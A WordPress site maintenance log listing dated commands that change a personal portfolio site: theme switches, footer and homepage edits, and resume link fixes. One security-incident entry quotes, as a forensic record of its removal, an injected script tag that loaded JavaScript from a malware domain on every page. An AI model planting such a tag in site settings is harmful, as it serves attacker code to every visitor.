# DB action log

Append-only record of DB-mutating commands initiated from local. The tail of this file is reviewed before any DB work, and a new entry is appended for every mutation.

Entry template:

```
## YYYY-MM-DD HH:MM TZ
**Intent:** one-line description
**Command:** exact command run
**Previous value:** if applicable
**Reverted?** no | yes — reason
```

---

## 2026-04-21 09:30 PT
**Intent:** Activate gutenify-hustle-child theme so future customizations (style.css, theme.json, template overrides) apply to the live site. The child theme currently has no overrides, so activation should produce no visible change.
**Command:** `wp theme activate gutenify-hustle-child`
**Previous value:** `template=gutenify-hustle`, `stylesheet=gutenify-hustle`
**Reverted?** yes — see 2026-04-24 entry; child theme caused header/footer to fall back to parent theme starter content because block-theme `wp_template_part` records are tagged to `gutenify-hustle`, not the child.

## 2026-04-24 09:28 CEST
**Intent:** Switch active theme back to `gutenify-hustle` to restore customized header/footer. The child theme's activation caused FSE template parts (tagged `theme=gutenify-hustle` in the DB) to not resolve, so header/footer fell through to the parent theme's default `parts/header.html` / `parts/footer.html` (starter content). Child theme files remain in place for later, once `theme.json` and `parts/` are added for correct inheritance.
**Command:** `wp theme activate gutenify-hustle`
**Previous value:** `template=gutenify-hustle`, `stylesheet=gutenify-hustle-child`
**Reverted?** no

## 2026-04-24 09:40 CEST
**Intent:** Update footer paragraph copy in `wp_template_part` post 224 (title "Footer"). Change "I have just" → "I have recently" and "am looking for" → "am open to".
**Command:** `wp post update 224 <new-content-file>` (content built by sed replacement of two narrow substrings on the current `post_content`)
**Previous value:** `I have just (summer 2023) moved to central Switzerland and am looking for Software Engineering, PM, or TPM opportunities.`
**Reverted?** no

## 2026-04-24 09:48 CEST
**Intent:** Add a GitHub button at the top of the "CS Related Profiles" list in footer template part 224 (above the existing LinkedIn and StackOverflow buttons). Button label "GitHub", href `https://github.com/kaitlynh`, `target="_blank" rel="noreferrer noopener"` — matches existing button markup pattern.
**Command:** `wp post update 224 <new-content-file>` (content built by inserting a new `wp:buttons` block before the LinkedIn `wp:buttons` block)
**Previous value:** Section contained only LinkedIn and StackOverflow buttons; heading text `CS Related Profiles` unchanged.
**Reverted?** no

## 2026-04-24 10:12 CEST
**Intent:** Update location line in footer template part 224 from "Altdorf, Switzerland" to "Altdorf, Uri, Switzerland" for specificity — Altdorf is in canton Uri.
**Command:** `wp post update 224 <new-content-file>`
**Previous value:** `Altdorf, Switzerland`
**Reverted?** no

## 2026-04-24 10:22 CEST
**Intent:** Update WordPress tagline (`blogdescription` option) from "Hello!" to "Software Engineer in Altdorf" to give the site a meaningful browser-tab title and SEO description. Visible "Hello!" heading on the homepage is unaffected (separate field).
**Command:** `wp option update blogdescription "Software Engineer in Altdorf"`
**Previous value:** `Hello!`
**Reverted?** no

## 2026-04-24 11:05 CEST — SECURITY INCIDENT
**Intent:** Remove malicious script injection found in `gutenify_settings.global_header_code`. Third-party AI research flagged `wpaii.com` as a known malware distribution domain. The injected script was being output on every page via Gutenify plugin's "global header code" feature, causing JS exceptions (the rendered output was `https:///a1.js` — domain stripped by some output filter, but the DB value contained the full malicious URL). Cache-bust param `?v=1759922667` decodes to ~Oct 2025, suggesting injection around that date.
**Command:** `wp option delete gutenify_settings` (the only key in the serialized array was the malicious value; deleting the whole option is equivalent to clearing the field, and Gutenify will recreate it on next save)
**Previous value (forensic record):** `a:1:{s:18:"global_header_code";s:60:"<script src=\"https://wpaii.com/a1.js?v=1759922667\"></script>";}`
**Reverted?** no — this is a cleanup; restoration would restore malware

## 2026-04-24 11:35 CEST
**Intent:** Remove `animated animated-fadeInUp` classes from the hero block of the Home page (post 15) so above-the-fold content renders immediately rather than fading in. This fixes a FOIT-like behavior where "Hello!" / "I'm Kait" / intro copy / "jump to contact" button would be invisible briefly on slow connections, and improves Largest Contentful Paint (LCP). Below-the-fold content keeps the fade-in animation (which triggers correctly on scroll).
**Command:** `wp post update 15 <new-content-file>` (targeted string replacement in the first ~27 lines of post_content only)
**Previous value:** Hero block had `animated animated-fadeInUp` class on h2 "Hello!", h2 "I'm Kait", the intro paragraph, and the "jump to contact" buttons wrapper.
**Reverted?** no

## 2026-04-24 11:45 CEST
**Intent:** Replace `[aiovg_video]` shortcode for the Simply Digital demo video with a lazy-loaded `youtube-nocookie.com` iframe. Benefits: (a) iframe only loads when near viewport (`loading="lazy"`), reducing eager network weight on page load; (b) privacy-enhanced mode (`youtube-nocookie.com`) avoids YouTube tracking cookies until the user actually interacts. Still auto-plays muted looping demo, still visually identical. User wants to keep directing people to her YouTube channel, so the embed itself stays.
**Command:** `wp post update 15 <new-content-file>` (replace shortcode block on line 78 with a custom HTML block; same video ID yYSbHGO0PAU)
**Previous value:** `[aiovg_video type="youtube" youtube="https://youtu.be/yYSbHGO0PAU" width="300" ratio="200" autoplay="1" loop="1" current="0" duration="0" tracks="0" volume="0"]`
**Reverted?** yes — see 2026-04-24 12:05 entry. The aiovg plugin was hiding YouTube's chrome (play button overlay, title bar) via its own wrapper JS; the youtube-nocookie iframe replacement exposed that chrome, which was a visible UX regression. Rolled back.

## 2026-04-24 12:05 CEST
**Intent:** Revert the youtube-nocookie iframe replacement on the Home page back to the original `aiovg_video` shortcode, because the plugin was hiding YouTube's native chrome (play button overlay, title bar) and the replacement exposed it. Lazy-loading win not worth the visible regression; re-evaluate later with CSS crop or self-hosted video approach.
**Command:** `wp post update 15 <new-content-file>`
**Previous value:** Custom HTML block with a lazy-loaded `youtube-nocookie.com` iframe.
**Reverted?** no

## 2026-04-24 16:15 CEST
**Intent:** Add three new content sections to the Home page (post 15): (1) "Who I Am" with intro text + skill badges (HTML5, CSS, JS, PHP, WordPress, Node.js, etc.); (2) "Recent Project" featuring urikalender.ch with image, body, and 3 buttons (live site, GitHub source, Hackdays Uri project page); (3) "Background" covering New Jersey origin, Northeastern University, location trajectory, citizenships, and languages. Also uploaded two new media attachments: urikalender screenshot (ID 334) and Kaitlyn graduation photo (ID 335). Sections inserted at: between Hero and Simply Digital (sections 1 + 2); between Hustle Castle and Travel Blog (section 3).
**Command:** `wp post update 15 /tmp/home_final.txt` plus `wp media import` for the two new images
**Previous value:** Home page had 8 existing sections (Hero → Simply Digital → Press → On YouTube → Hustle Castle → Travel Blog → Podcast → Parenting). New state has 11 sections in the new order.
**Reverted?** no

## 2026-04-24 16:45 CEST
**Intent:** Fix alternating-background pattern on Home page (post 15) after the 3 new sections broke it, plus move the "Uri has a lot going on..." paragraph from the right column of the Recent Project section to below the image in the left column (left column was too tall / unbalanced). Section bg swaps: Who I Am (→ background-secondary), Recent Project (→ background), Background (→ background-secondary), Traveling/Travel Blog (→ background), Aurora & Lavinia/Parenting (→ background).
**Command:** `wp post update 15 /tmp/home_final_v2.txt`
**Previous value:** Who I Am=background; Recent Project=background-secondary; Background=background; Travel Blog=background-secondary; Parenting=background-secondary. Uri paragraph was inside right text column.
**Reverted?** no

## 2026-04-24 16:50 CEST (file swap, not DB — logged here for continuity)
**Intent:** Replace the public "View Resume" PDF with an updated version. Old file backed up to `~/backups/Kaitlyn_Hanrahan_Resume.old.YYYYMMDD-HHMMSS.pdf` on server before overwrite.
**Command:** `scp local Kaitlyn_Hanrahan_Resume.pdf dreamhost:~/kait.us/wp-content/uploads/2023/08/Kaitlyn_Hanrahan_Resume.pdf`
**Previous value:** Original 2023-era resume. Backup retained on server.
**Reverted?** no

## 2026-04-24 17:00 CEST
**Intent:** Add `?v=20260424` cache-bust query to the "View Resume" button href in Header template part (post 239) so browsers fetch the newly-uploaded PDF instead of their cached copy of the old one.
**Command:** `wp post update 239 <new-content-file>`
**Previous value:** `href="https://www.kait.us/wp-content/uploads/2023/08/Kaitlyn_Hanrahan_Resume.pdf"`
**Reverted?** no

## 2026-04-24 17:05 CEST
**Intent:** Make "View Resume" button open the PDF in a new tab. Added `target="_blank"` + `rel="noreferrer noopener"` on the anchor, and `linkTarget`/`rel` attributes to the wp:button block comment so Gutenberg round-trips correctly.
**Command:** `wp post update 239 <new-content-file>`
**Previous value:** Anchor had no `target` attribute; opened resume in same tab.
**Reverted?** no

## 2026-04-24 17:12 CEST
**Intent:** Fix two other "View Resume" links that were pointing to an OLD resume PDF (`2023/03/Kaitlyn_Hanrahan.pdf`) instead of the current one (`2023/08/Kaitlyn_Hanrahan_Resume.pdf`). Updated links on the Contact Me page (post 181) and Footer template part (post 224) to point to the new URL with cache-bust. Old file `2023/03/Kaitlyn_Hanrahan.pdf` left in place (harmless; nothing else references it after this edit).
**Command:** `wp post update 181 <file>` and `wp post update 224 <file>` (sed-replaced the href)
**Previous value:** Both had `href="https://www.kait.us/wp-content/uploads/2023/03/Kaitlyn_Hanrahan.pdf"`
**Reverted?** no

## 2026-04-24 17:25 CEST
**Intent:** Change the hero "jump to contact" button to smooth-scroll to the footer instead of navigating to the Contact page. (1) Added `anchor="contact"` + `id="contact"` to the outer wrapper of the Footer template part (post 224) so it becomes a scroll target. (2) Changed the hero button's href on the Home page (post 15) from `/contact/` to `#contact`.
**Command:** `wp post update 224 <file>` + `wp post update 15 <file>`
**Previous value:** Hero button href = `/contact/` (full page navigation). Footer wrapper had no id.
**Reverted?** no

## 2026-04-24 17:30 CEST
**Intent:** Enable smooth-scroll animation on anchor links site-wide (specifically for the "jump to contact" button, but applies to any `#anchor` navigation). Added `html { scroll-behavior: smooth; }` via WordPress's Customizer Additional CSS mechanism: created a `custom_css` post (ID 345, post_name `gutenify-hustle` matching the active theme slug) and pointed the `custom_css_post_id` theme mod at it.
**Command:** `wp post create --post_type=custom_css ...` + `wp theme mod set custom_css_post_id 345`
**Previous value:** No custom_css post existed (`custom_css_post_id` was -1).
**Reverted?** no
